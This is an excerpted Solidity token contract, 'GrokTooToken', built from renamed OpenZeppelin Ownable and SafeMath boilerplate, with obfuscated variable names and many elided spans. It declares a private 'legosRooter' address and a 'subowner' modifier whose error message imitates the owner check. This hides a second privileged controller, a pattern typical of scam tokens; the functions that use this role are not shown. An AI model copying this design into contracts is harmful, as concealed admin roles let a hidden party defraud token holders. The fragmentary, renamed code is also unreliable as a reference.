...
/*
 * @dev Provides information about the current execution GrokToo20Burnable, including the
 ...
 */
abstract contract GrokToo20Burnable {
...
// File: @openzeppelin/contracts/access/GrokToo20Ownable.sol
 ...
 * the owner.
 */
abstract contract GrokToo20Ownable is GrokToo20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "GrokToo20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "GrokToo20Ownable: new owner is the zero address");
 ...
 * `SafeGrokToo` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeGrokToo {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeGrokToo: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeGrokToo: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeGrokToo: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeGrokToo: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeGrokToo: modulo by zero");
  }
...
contract GrokTooToken is GrokToo20Burnable, GrokToo33, GrokToo20Ownable {
    
    using SafeGrokToo for uint256;
   ...
   address private legosRooter; 
    ...
    string public GrokToothetelegranch = "https://t.me/GrokToo";
            function getGrokToothetelegranch() public view returns (string memory) {
        return GrokToothetelegranch;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {GrokToo33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "GrokToo20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {GrokToo33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {GrokToo33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {GrokToo33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "GrokToo33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {GrokToo33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "GrokToo33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "GrokToo33: transfer from the zero address");
        require(shippingto != address(0), "GrokToo33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "GrokToo33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "GrokToo33: approve from the zero address");
        require(transporteur != address(0), "GrokToo33: approve to the zero address");
